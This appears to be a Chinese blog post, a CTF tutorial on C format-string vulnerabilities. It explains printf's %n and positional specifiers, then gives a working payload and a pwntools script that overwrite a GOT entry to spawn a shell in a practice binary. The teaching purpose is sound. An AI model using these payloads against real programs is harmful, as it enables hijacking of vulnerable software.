@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="rBm2uFCV50">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.plusls.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一个坑爹的问题这个问题与主题没太大关系，还是提一提吧 在ubuntu16.10后 gcc 编译时默认加上了参数-pie，也就是运行地址随机化，可以更好的抵挡攻击，防pwn，但是出题就比较坑爹了 只需要编译时加上参数-no-pie即可 格式化字符串简介 格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函">
+<meta property="og:type" content="article">
+<meta property="og:title" content="格式化字符串漏洞">
+<meta property="og:url" content="https://blog.plusls.com/technical/binary/pwn/format-string/">
+<meta property="og:site_name" content="plusls&#39; blog">
+<meta property="og:description" content="一个坑爹的问题这个问题与主题没太大关系，还是提一提吧 在ubuntu16.10后 gcc 编译时默认加上了参数-pie，也就是运行地址随机化，可以更好的抵挡攻击，防pwn，但是出题就比较坑爹了 只需要编译时加上参数-no-pie即可 格式化字符串简介 格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.plusls.com/technical/binary/pwn/format-string/img/1.png">
+<meta property="og:image" content="https://blog.plusls.com/technical/binary/pwn/format-string/img/2.png">
+<meta property="og:image" content="https://blog.plusls.com/technical/binary/pwn/format-string/img/3.png">
+<meta property="article:published_time" content="2017-04-08T07:34:30.000Z">
+<meta property="article:modified_time" content="2017-10-04T18:34:41.000Z">
+<meta property="article:author" content="plusls">
+<meta property="article:tag" content="none">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.plusls.com/technical/binary/pwn/format-string/img/1.png">
+
+
+<link rel="canonical" href="https://blog.plusls.com/technical/binary/pwn/format-string/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.plusls.com/technical/binary/pwn/format-string/","path":"technical/binary/pwn/format-string/","title":"格式化字符串漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>格式化字符串漏洞 | plusls' blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-96606331-1"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-96606331-1","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="plusls' blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">plusls' blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一条咸鱼的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">6</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">24</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">35</span></a></li><li class="menu-item menu-item-friends"><a href="/friends/" rel="section"><i class="fa fa-address-book fa-fw"></i>friends</a></li><li class="menu-item menu-item-todo-list"><a href="/todo-list/" rel="section"><i class="fa fa-calendar fa-fw"></i>todo-list</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E5%9D%91%E7%88%B9%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">一个坑爹的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">格式化字符串简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="nav-number">3.</span> <span class="nav-text">漏洞原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E5%A7%8B%E7%9A%84%E8%AE%A1%E7%AE%97%E6%B3%95"><span class="nav-number">5.</span> <span class="nav-text">原始的计算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8pwntools"><span class="nav-number">6.</span> <span class="nav-text">使用pwntools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%BE%83%E5%8E%9F%E5%A7%8B%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">6.1.</span> <span class="nav-text">比较原始的方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-number">7.</span> <span class="nav-text">附录</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="plusls"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">plusls</p>
+  <div class="site-description" itemprop="description">咸鱼</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/plusls" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;plusls" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:plusls@qq.com" title="E-Mail → mailto:plusls@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/plusls" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.plusls.com/technical/binary/pwn/format-string/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="plusls">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="plusls' blog">
+      <meta itemprop="description" content="咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="格式化字符串漏洞 | plusls' blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          格式化字符串漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-04-08 15:34:30" itemprop="dateCreated datePublished" datetime="2017-04-08T15:34:30+08:00">2017-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2017-10-05 02:34:41" itemprop="dateModified" datetime="2017-10-05T02:34:41+08:00">2017-10-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/technical/" itemprop="url" rel="index"><span itemprop="name">technical</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/technical/binary/" itemprop="url" rel="index"><span itemprop="name">binary</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/technical/binary/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/technical/binary/pwn/format-string/" class="post-meta-item leancloud_visitors" data-flag-title="格式化字符串漏洞" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="一个坑爹的问题"><a href="#一个坑爹的问题" class="headerlink" title="一个坑爹的问题"></a>一个坑爹的问题</h2><p>这个问题与主题没太大关系，还是提一提吧</p>
+<p>在ubuntu16.10后 gcc 编译时默认加上了参数<code>-pie</code>，也就是运行地址随机化，可以更好的抵挡攻击，防pwn，但是出题就比较坑爹了</p>
+<p>只需要编译时加上参数<code>-no-pie</code>即可</p>
+<h2 id="格式化字符串简介"><a href="#格式化字符串简介" class="headerlink" title="格式化字符串简介"></a>格式化字符串简介</h2><blockquote>
+<p>格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p>
+</blockquote>
+<p>以上摘自wiki:<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串</a></p>
+<p>为了格式化字符串，需要使用占位符用于指明输出的参数值如何格式化。</p>
+<p>在c语言中的printf这一大类函数中（包括vprintf，sprintf等），使用%d,%c,%s等占位符对字符串进行格式化  </p>
+<p>然而，一些特殊的用法往往被人们忽略了</p>
+<span id="more"></span>
+
+<ul>
+<li><p>控制输出长度</p>
+<p><code>%nx</code>表示按16进制输出，不足n位的话在字符串前面补空格</p>
+<p><code>%0nx</code>表示按16进制输出，不足n位的话在字符串前面补空格</p>
+<p>其它占位符同理  </p>
+</li>
+<li><p>指定参数</p>
+<p><code>%n$x</code>表示把第n个参数按16进制输出  </p>
+<p>注：  </p>
+<p>a. 指定参数可以与控制输出长度结合使用，如<code>%n$08x</code> </p>
+<p>b. 指定参数不影响正常的输出，若执行<code>printf(&quot;%3$d.%d.%d.%d&quot;, 1, 2, 3);</code>，则输出3.1.2.3</p>
+<p>c.在x86下指定参数时printf认为每个参数的长度为4字节，所以在碰上<code>long long</code>这样8字节或者更多的参数时，指定参数可能会出错，需要具体情况具体分析</p>
+</li>
+<li><p>保存输出字符的个数</p>
+<p>可使用%n保存输出字符的个数到变量中</p>
+<p><code>printf(&quot;1234%n&quot;, &amp;a)</code>由于输出了4个字符，将4写入a</p>
+<p>注:</p>
+<p>a.可以与指定参数结合使用</p>
+<p>b.后面的参数为变量的地址，而不是变量的本身（好像是废话）</p>
+</li>
+</ul>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>在c语言中，往往有输出字符串的场景，当输出一个字符串的一般写法为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br></pre></td></tr></table></figure>
+<p>当一些程序员偷懒后就成为了  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure>
+<p>若是攻击者掌握了字符串，那么可以利用1中的特殊用法，对你的程序做一些奇怪的事情，从而pwn掉你的程序</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>由1可知道，%n可以写入数据，%nc等用法可以控制输出字符的长度从而控制数据的数值，结合指定参数，便可以对4字节内存进行读写</p>
+<p>下面以一个题为例来说明  </p>
+<p>题目源码以及elf文件在文末附件中</p>
+<p>丢进ida后明显可以看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;s, <span class="number">0x3FF</span>u);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Haha, your input is:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(&amp;s);</span><br></pre></td></tr></table></figure>
+<p>明显的一个格式化字符串漏洞</p>
+<p>又看到</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getflag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现没有地方调用getflag，考虑修改got表将下面的strlen的函数地址改为getflag的地址（其实不给getflag函数也可以做到，先考虑简单情况）。</p>
+<p>首先先查询str相当于printf的第几个参数</p>
+<p>命令中输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">&quot;print(&#x27;aaaa.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x&#x27;)&quot;</span>;)|./repeat</span><br></pre></td></tr></table></figure>
+<p>执行后结果为</p>
+<p><img data-src="/technical/binary/pwn/format-string/img/1.png" alt="result"> </p>
+<p>a对应的16进制ascii码为<code>61</code>，由此可以看出第4个参数为str</p>
+<p>执行下列语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">&quot;print(&#x27;aaaa.%4\$08x&#x27;)&quot;</span>;)|./repeat</span><br></pre></td></tr></table></figure>
+<p>结果为</p>
+<p><img data-src="/technical/binary/pwn/format-string/img/2.png" alt="shell"></p>
+<p>验证自己的语句为正确的</p>
+<p>注:</p>
+<ol>
+<li>在python中$需要使用\进行转义输出，应为<code>\$</code></li>
+<li>python3全体都是unicode，对于一些不可见字符的处理存在问题，故使用python进行操作</li>
+</ol>
+<p>既然知道了位置，便可着手写poc了，本文将介绍2种方法</p>
+<h2 id="原始的计算法"><a href="#原始的计算法" class="headerlink" title="原始的计算法"></a>原始的计算法</h2><p>打开终端，输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -r repeat | grep strlen</span><br></pre></td></tr></table></figure>
+<p>结果为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0804a01c  00000607 R386JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+
+<p>可以看出strlen在got表中的位置为 <strong>0x0804a01c</strong></p>
+<p>注:</p>
+<ol>
+<li>readelf命令可以查看elf文件信息，-r表示显示可重定位段的信息</li>
+<li>程序执行动态链接库的函数时，先跳转到plt表，然后跳转到got表</li>
+</ol>
+<p>ida可以看到下图</p>
+<p><img data-src="/technical/binary/pwn/format-string/img/3.png" alt="asm"></p>
+<p>可以得知getflag的地址为 <strong>0x0804853b</strong></p>
+<p>接下来构造字符串更改strlen函数地址即可</p>
+<p>输入如下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(python -c <span class="string">&quot;print(&#x27;\x1c\xa0\x04\x08\x1d\xa0\x04\x08\x1e\xa0\x04\x08%47c%4\$hhn%74c%5\$hhn%1919c%6\$hn&#x27;)&quot;</span>;<span class="built_in">cat</span>) | ./repeat</span><br></pre></td></tr></table></figure>
+<p>即拿到shell</p>
+<p>注:</p>
+<ol>
+<li>%n写入4字节，%hn写入2字节，%hhn写入1字节</li>
+<li>由于需要写入<code>0x0804853b</code>，数据过大，分成三次写入，分别写入0x3b， 0x85, 0x0804（否则会输出时间过长，甚至段错误）</li>
+<li>后面的数值可以自己计算，写入0x3b就应该保证前面输出了0x3b个字符，由于前面已经输出了12个字符，剩下只需要再输出0x3b - 12 &#x3D; 47个字符。在需要写入0x85时只需要再输出0x85 - 0x3b &#x3D; 74个字符，下面的同理</li>
+</ol>
+<h2 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h2><h3 id="比较原始的方法"><a href="#比较原始的方法" class="headerlink" title="比较原始的方法"></a>比较原始的方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- #</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化变量 获取数据</span></span><br><span class="line">r_program = process(<span class="string">&#x27;./repeat&#x27;</span>)</span><br><span class="line">program = ELF(<span class="string">&#x27;pwn8&#x27;</span>)</span><br><span class="line">got_printf = program.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">program_getflag = program.symbols[<span class="string">&#x27;getflag&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造shellcode 需要将地址分2次写入</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += p32(got_printf)</span><br><span class="line">shellcode += p32(got_printf + <span class="number">2</span>)</span><br><span class="line">high4 = program_getflag / <span class="number">0x10000</span></span><br><span class="line">low4 = program_getflag % <span class="number">0x10000</span></span><br><span class="line">shellcode += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(low4 - <span class="number">8</span>) +<span class="string">&#x27;c%4$hn&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x10000</span> + high4 - low4) +<span class="string">&#x27;c%5$hn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送shellcode</span></span><br><span class="line">r_program.sendline(shellcode)</span><br><span class="line">r_program.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>附件： <a href="pwn8.zip">pwn8.zip</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/alipay.png" alt="plusls 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>plusls
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://blog.plusls.com/technical/binary/pwn/format-string/" title="格式化字符串漏洞">https://blog.plusls.com/technical/binary/pwn/format-string/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/technical/binary/tools/use-gdb/" rel="prev" title="使用GDB">
+                  <i class="fa fa-chevron-left"></i> 使用GDB
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/technical/binary/pwn/shellcode/" rel="next" title="shellcode">
+                  shellcode <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">plusls</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">89k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:21</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
